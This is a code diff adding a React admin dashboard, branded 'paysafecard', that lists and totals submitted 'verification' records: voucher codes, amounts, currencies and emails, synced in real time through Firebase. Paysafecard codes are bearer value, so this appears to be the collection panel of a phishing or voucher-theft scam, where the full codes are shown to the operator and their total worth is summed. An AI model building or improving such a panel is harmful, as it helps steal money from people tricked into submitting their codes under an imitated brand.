@@ -1,0 +1,388 @@
+import { useState, useEffect } from "react";
+import {
+  addVerification as firebaseAdd,
+  onVerificationsSnapshot,
+  clearAllVerifications,
+  checkFirebaseConnection,
+  type FirebaseVerification,
+} from "../utils/firebase";
+
+export interface VerificationRecord {
+  id: string;
+  code: string;
+  amount: string;
+  currency: string;
+  email: string;
+  date: string;
+  timestamp: number;
+  emailStatus: "success" | "failed";
+}
+
+// Save — writes to Firebase + localStorage fallback
+export async function saveVerification(
+  record: Omit<VerificationRecord, "id" | "date" | "timestamp">
+) {
+  // Always save to localStorage as fallback
+  const existing = getLocalVerifications();
+  const now = new Date();
+  const newRecord: VerificationRecord = {
+    ...record,
+    id: crypto.randomUUID?.() || Math.random().toString(36).slice(2),
+    date: now.toLocaleString(),
+    timestamp: now.getTime(),
+  };
+  existing.unshift(newRecord);
+  localStorage.setItem("paysafe_verifications", JSON.stringify(existing));
+
+  // Also save to Firebase
+  try {
+    await firebaseAdd(record);
+  } catch {
+    console.log("Firebase save failed, data saved locally");
+  }
+}
+
+function getLocalVerifications(): VerificationRecord[] {
+  try {
+    const data = localStorage.getItem("paysafe_verifications");
+    return data ? JSON.parse(data) : [];
+  } catch {
+    return [];
+  }
+}
+
+interface AdminDashboardProps {
+  onBack: () => void;
+}
+
+/* ── Connection Status Badge ── */
+function ConnectionBadge({ connected }: { connected: boolean | null }) {
+  if (connected === null) {
+    return (
+      <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-medium bg-yellow-100 text-yellow-700">
+        <span className="w-2 h-2 rounded-full bg-yellow-400 animate-pulse" />
+        Connecting...
+      </span>
+    );
+  }
+  return (
+    <span
+      className={`inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-medium ${
+        connected
+          ? "bg-green-100 text-green-700"
+          : "bg-red-100 text-red-700"
+      }`}
+    >
+      <span
+        className={`w-2 h-2 rounded-full ${
+          connected ? "bg-green-500" : "bg-red-500"
+        }`}
+      />
+      {connected ? "Firebase Connected" : "Firebase Disconnected"}
+    </span>
+  );
+}
+
+export default function AdminDashboard({ onBack }: AdminDashboardProps) {
+  const [records, setRecords] = useState<VerificationRecord[]>([]);
+  const [search, setSearch] = useState("");
+  const [dbConnected, setDbConnected] = useState<boolean | null>(null);
+
+  useEffect(() => {
+    // Check Firebase connection
+    checkFirebaseConnection().then((ok) => setDbConnected(ok));
+
+    // Subscribe to real-time Firebase updates
+    const unsubscribe = onVerificationsSnapshot((firebaseRecords) => {
+      // If we get a callback (even empty), Firebase is connected
+      setDbConnected(true);
+      
+      if (firebaseRecords.length > 0) {
+        const mapped: VerificationRecord[] = firebaseRecords.map((r) => ({
+          id: r.id,
+          code: r.code || "",
+          amount: r.amount || "",
+          currency: r.currency || "",
+          email: r.email || "",
+          date: r.date || "",
+          timestamp: r.timestamp || 0,
+          emailStatus: r.emailStatus || "failed",
+        }));
+        setRecords(mapped);
+      } else {
+        // Firebase connected but empty — check localStorage
+        const local = getLocalVerifications();
+        setRecords(local);
+      }
+    });
+
+    return () => unsubscribe();
+  }, []);
+
+  const filtered = records.filter(
+    (r) =>
+      r.code.toLowerCase().includes(search.toLowerCase()) ||
+      r.email.toLowerCase().includes(search.toLowerCase()) ||
+      r.currency.toLowerCase().includes(search.toLowerCase())
+  );
+
+  // Stats
+  const totalVerifications = records.length;
+  const todayCount = records.filter((r) => {
+    const today = new Date();
+    const d = new Date(r.timestamp);
+    return d.toDateString() === today.toDateString();
+  }).length;
+  const uniqueEmails = new Set(records.map((r) => r.email)).size;
+  const totalAmount = records.reduce(
+    (sum, r) => sum + (parseFloat(r.amount) || 0),
+    0
+  );
+  const emailsSuccess = records.filter(
+    (r) => r.emailStatus === "success"
+  ).length;
+  const emailsFailed = records.filter(
+    (r) => r.emailStatus === "failed"
+  ).length;
+
+  const handleClearAll = async () => {
+    if (confirm("Are you sure you want to clear all records?")) {
+      localStorage.removeItem("paysafe_verifications");
+      await clearAllVerifications();
+      setRecords([]);
+    }
+  };
+
+  return (
+    <div className="min-h-screen" style={{ backgroundColor: "#F3F4F6" }}>
+      {/* Header */}
+      <header
+        className="sticky top-0 z-50"
+        style={{
+          background: "linear-gradient(135deg, #1236B8 0%, #1A45D2 100%)",
+          boxShadow: "0 2px 12px rgba(0,0,0,0.15)",
+        }}
+      >
+        <div className="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between">
+          <div className="flex items-center gap-4">
+            <button
+              onClick={onBack}
+              className="text-white/80 hover:text-white transition text-sm flex items-center gap-1"
+            >
+              <svg
+                width="16"
+                height="16"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                strokeWidth="2"
+                strokeLinecap="round"
+                strokeLinejoin="round"
+              >
+                <path d="M15 18l-6-6 6-6" />
+              </svg>
+              Back
+            </button>
+            <h1 className="text-white font-bold text-xl tracking-tight">
+              Admin Dashboard
+            </h1>
+          </div>
+          <div className="flex items-center gap-3">
+            <ConnectionBadge connected={dbConnected} />
+            <div className="text-white/60 text-xs hidden sm:block">paysafecard</div>
+          </div>
+        </div>
+      </header>
+
+      <div className="max-w-7xl mx-auto px-6 py-8">
+        {/* Stats Cards */}
+        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-5 mb-5">
+          <StatCard
+            label="Total Verifications"
+            value={totalVerifications.toString()}
+            icon="📊"
+            color="#1236B8"
+          />
+          <StatCard
+            label="Today"
+            value={todayCount.toString()}
+            icon="📅"
+            color="#0B9444"
+          />
+          <StatCard
+            label="Unique Emails"
+            value={uniqueEmails.toString()}
+            icon="📧"
+            color="#E65100"
+          />
+        </div>
+        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-5 mb-8">
+          <StatCard
+            label="Total Amount"
+            value={totalAmount.toFixed(2)}
+            icon="💰"
+            color="#7B1FA2"
+          />
+          <StatCard
+            label="Emails Sent ✓"
+            value={emailsSuccess.toString()}
+            icon="✅"
+            color="#0B9444"
+          />
+          <StatCard
+            label="Emails Failed ✗"
+            value={emailsFailed.toString()}
+            icon="❌"
+            color="#D32F2F"
+          />
+        </div>
+
+        {/* Controls */}
+        <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 mb-6">
+          <h2 className="text-lg font-semibold text-slate-800">
+            Verification Records
+            <span className="ml-2 text-xs font-normal text-slate-400">
+              {dbConnected ? "(real-time sync)" : "(local data)"}
+            </span>
+          </h2>
+          <div className="flex items-center gap-3 w-full sm:w-auto">
+            <input
+              type="text"
+              value={search}
+              onChange={(e) => setSearch(e.target.value)}
+              placeholder="Search by code, email, currency..."
+              className="flex-1 sm:w-[300px] rounded-lg bg-white text-slate-700 placeholder:text-slate-400 px-4 py-2.5 text-sm border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500/30 shadow-sm"
+            />
+            {records.length > 0 && (
+              <button
+                onClick={handleClearAll}
+                className="text-xs text-red-500 hover:text-red-700 transition font-medium whitespace-nowrap"
+              >
+                Clear all
+              </button>
+            )}
+          </div>
+        </div>
+
+        {/* Table */}
+        {filtered.length === 0 ? (
+          <div className="bg-white rounded-xl shadow-sm border border-slate-100 p-16 text-center">
+            <div className="text-4xl mb-3">📭</div>
+            <p className="text-slate-500 text-base">
+              {records.length === 0
+                ? "No verifications yet. Records will appear here after users submit the form."
+                : "No results matching your search."}
+            </p>
+          </div>
+        ) : (
+          <div className="bg-white rounded-xl shadow-sm border border-slate-100 overflow-hidden">
+            <div className="overflow-x-auto">
+              <table className="w-full text-sm">
+                <thead>
+                  <tr
+                    className="border-b border-slate-100"
+                    style={{ backgroundColor: "#F9FAFB" }}
+                  >
+                    <th className="text-left px-5 py-3 font-semibold text-slate-600 text-xs uppercase tracking-wide">
+                      #
+                    </th>
+                    <th className="text-left px-5 py-3 font-semibold text-slate-600 text-xs uppercase tracking-wide">
+                      Date
+                    </th>
+                    <th className="text-left px-5 py-3 font-semibold text-slate-600 text-xs uppercase tracking-wide">
+                      Code
+                    </th>
+                    <th className="text-left px-5 py-3 font-semibold text-slate-600 text-xs uppercase tracking-wide">
+                      Amount
+                    </th>
+                    <th className="text-left px-5 py-3 font-semibold text-slate-600 text-xs uppercase tracking-wide">
+                      Currency
+                    </th>
+                    <th className="text-left px-5 py-3 font-semibold text-slate-600 text-xs uppercase tracking-wide">
+                      Email
+                    </th>
+                    <th className="text-left px-5 py-3 font-semibold text-slate-600 text-xs uppercase tracking-wide">
+                      Email Status
+                    </th>
+                  </tr>
+                </thead>
+                <tbody>
+                  {filtered.map((r, i) => (
+                    <tr
+                      key={r.id}
+                      className="border-b border-slate-50 hover:bg-slate-50/50 transition"
+                    >
+                      <td className="px-5 py-3 text-slate-400 font-mono text-xs">
+                        {filtered.length - i}
+                      </td>
+                      <td className="px-5 py-3 text-slate-600 text-xs whitespace-nowrap">
+                        {r.date}
+                      </td>
+                      <td className="px-5 py-3 font-mono font-semibold text-slate-800 tracking-wide">
+                        {r.code}
+                      </td>
+                      <td className="px-5 py-3 font-semibold text-slate-800">
+                        {r.amount}
+                      </td>
+                      <td className="px-5 py-3 text-slate-600 uppercase">
+                        {r.currency}
+                      </td>
+                      <td className="px-5 py-3 text-blue-600">{r.email}</td>
+                      <td className="px-5 py-3">
+                        <span
+                          className="inline-flex items-center gap-1 px-2.5 py-1 rounded-full text-xs font-semibold"
+                          style={{
+                            backgroundColor:
+                              r.emailStatus === "success"
+                                ? "#E8F5E9"
+                                : "#FFEBEE",
+                            color:
+                              r.emailStatus === "success"
+                                ? "#2E7D32"
+                                : "#C62828",
+                          }}
+                        >
+                          {r.emailStatus === "success"
+                            ? "✓ Sent"
+                            : "✗ Failed"}
+                        </span>
+                      </td>
+                    </tr>
+                  ))}
+                </tbody>
+              </table>
+            </div>
+          </div>
+        )}
+      </div>
+    </div>
+  );
+}
+
+/* ── Stat Card ── */
+function StatCard({
+  label,
+  value,
+  icon,
+  color,
+}: {
+  label: string;
+  value: string;
+  icon: string;
+  color: string;
+}) {
+  return (
+    <div className="bg-white rounded-xl shadow-sm border border-slate-100 p-5 flex items-center gap-4">
+      <div
+        className="w-12 h-12 rounded-xl flex items-center justify-center text-xl"
+        style={{ backgroundColor: `${color}15` }}
+      >
+        {icon}
+      </div>
+      <div>
+        <div className="text-2xl font-bold text-slate-900">{value}</div>
+        <div className="text-xs text-slate-500 mt-0.5">{label}</div>
+      </div>
+    </div>
+  );
+}
